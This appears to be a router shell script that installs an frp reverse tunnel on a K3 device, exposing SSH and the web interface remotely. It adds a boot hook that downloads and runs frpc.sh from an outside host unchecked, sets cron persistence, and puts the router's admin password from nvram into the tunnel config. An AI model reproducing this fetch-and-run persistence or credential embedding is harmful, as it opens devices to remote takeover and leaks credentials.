#!/bin/sh
# for K3_root , ARM cpu
user=$(nvram get http_username) ; crontab="/etc/crontabs/$user" ; frpc_sh="http://xiongxinyi.cn:2015/tools/frp/frpc.sh"
grep -qi "frpc.sh" /opt/started_script.sh || \
echo "sleep 50 ; wget -P /tmp/ $frpc_sh && mv -f /tmp/frpc.sh /opt/ ; sh /opt/frpc.sh" >> /opt/started_script.sh
grep -qi "reboot" $crontab || echo "5 5 */2 * * [ \$(date +%w) -eq 5 ] && reboot || ping -c2 -w5 114.114.114.114 || reboot" >> $crontab
grep -qi "frpc.sh" $crontab || echo "10 * * * * [ \$(date +%k) -eq 10 ] && killall frpc ; sh /opt/frpc.sh" >> $crontab
name=$(nvram get product) ; lanip=$(nvram get lan_ipaddr) && i=$(echo $lanip | cut -d . -f 3)

# -----1、填写服务端的IP/域名、认证密码即可---------------------------
server_addr="" ; token="" ; ssh_remote_port=$(date +1%M%S) ; subdomain="${name:0:2}$i" 
# -----2、是否开启ttyd(web_ssh)、Telnet(或远程桌面)、简单的http_file文件服务; 0表示不开启，1表示开启 ------------
telnet_enable=0 ; if [ $telnet_enable -eq 1 ] ; then telnet_local_ip=192.168.11.10 ; telnet_local_port=23 ; sleep 1 && telnet_remote_port=$(date +1%M%S) ; fi
http_file_enable=0 ; if [ $http_file_enable -eq 1 ] ; then http_file_path="/media/AiCard_01/" ; sleep 1 && http_file_port=$(date +1%M%S) ; fi
# -----3、ttyd、frpc的下载地址、frpcini设置临时配置(默认/tmp/)还是永久保存配置(/etc/storage/)----------------
frpc_url="http://xiongxinyi.cn:2015/tools/frp/frpc_arm" && md5_frpc="38cf9774939e956b220cc40bb1572742"
frpc_url_bak="http://xiongxinyi.cn:11111/file/frp/frpc_arm" && md5_frpc_bak="4735fa6f7426dbcd2951d201e1f93ecc"

frpcini="/tmp/frpc.ini" ; frpc="/tmp/frpc" 
frpcini="/opt/frpc.ini" 
frpc="/opt/frpc" && [ -d "$(dirname $frpc)" ] || frpc="/tmp/frpc"

#echo -------------------------- frpc ---------------------------------------------------
download_frpc() {
  rm -f $frpc ; wget -O $frpc $frpc_url &
  sleep 60 ; killall -q frpc wget curl
  [ "$(md5sum $frpc | cut -d " " -f 1)" != "$md5_frpc" ] && rm -f $frpc && wget -O $frpc $frpc_url_bak 
}
[ -f "$frpc" ] && frpc_md5sum=$(md5sum $frpc | cut -d " " -f 1) && \
[ "$frpc_md5sum" = "$md5_frpc" -o "$frpc_md5sum" = "$md5_frpc_bak" ] || download_frpc ; chmod 555 $frpc 
#echo ------------------------- frpc.ini ------------------------------------------------
if [ ! -f "$frpcini" ] ; then
cat << END > $frpcini
[common]
server_addr = $server_addr
server_port = 7000
protocol = tcp
token = $token
user = $name
pool_count = 8
tcp_mux = true
login_fail_exit = true
# ----- SSH_port:22 / Telnet_port:23 / RemoteDesktop_port:3389 -----
[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = $ssh_remote_port
use_encryption = false
use_compression = false
# ---------------- http Tunnel config ---------------- 
[$subdomain]
type = http
local_ip = $lanip
local_port = 80
use_encryption = false
use_compression = false
http_user = 
http_pwd = 
subdomain = $subdomain 
custom_domains = $subdomain / $user / $(nvram get http_passwd)
END
  if [ $telnet_enable -eq 1 ] ; then 
echo -e "# ----- Telnet:23 / RemoteDesktop:3389 Tunnel config ----- " >> $frpcini
echo -e "[telnet] \ntype = tcp \nlocal_ip = $telnet_local_ip " >> $frpcini
echo -e "local_port = $telnet_local_port \nremote_port = $telnet_remote_port " >> $frpcini
echo -e "use_encryption = false \nuse_compression = false \n" >> $frpcini
  fi
  if [ $http_file_enable -eq 1 ] ; then
echo -e "# ----- http_file Tunnel config --- use:http://x.x.x.x:file_port/file/ ----- " >> $frpcini
echo -e "[http_file] \ntype = tcp \nremote_port = $http_file_port \nplugin = static_file " >> $frpcini
echo -e "plugin_local_path = $http_file_path \nplugin_strip_prefix = file " >> $frpcini
echo -e "plugin_http_user = \nplugin_http_passwd = \n" >> $frpcini
  fi
fi
#echo ------------------------- start frpc ----------------------------------------------
ping -c2 -w5 114.114.114.114 && \
if [ -z "$(pidof frpc)" ] ; then
      logger -t frpc "frpc is not running ; starting frpc......"
      $frpc -c $frpcini &
else  logger -t frpc "frpc is running ; Don't do everything !"
fi
[ $(echo $?) -eq 0 ] || logger -t frpc "Internet is Down , Connection failure ! ! !"
